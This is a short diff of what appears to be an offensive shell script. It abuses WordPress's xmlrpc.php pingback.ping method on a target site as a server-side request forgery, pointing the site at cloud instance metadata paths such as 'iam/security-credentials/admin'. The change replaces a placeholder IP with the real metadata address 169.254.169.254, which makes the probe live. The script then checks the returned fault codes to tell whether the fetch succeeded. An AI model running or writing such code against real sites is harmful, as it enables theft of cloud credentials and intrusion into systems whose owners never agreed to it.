@@ -93,7 +93,7 @@ for path in "" "iam/security-credentials/" "iam/security-credentials/admin" \
 
   result=$(curl --max-time 30 --connect-timeout 10 -sk -X POST "https://$TARGET/xmlrpc.php" -H "Content-Type: text/xml" \
     -d "<?xml version=\"1.0\"?><methodCall><methodName>pingback.ping</methodName>
-<params><param><value><string>http://192.0.2.1/latest/meta-data/$path</string></value></param>
+<params><param><value><string>http://169.254.169.254/latest/meta-data/$path</string></value></param>
 <param><value><string>https://$TARGET/?p=1</string></value></param></params></methodCall>" 2>/dev/null | grep -o 'faultCode>[0-9]*')
 
   code=$(echo "$result" | grep -o '[0-9]\+')
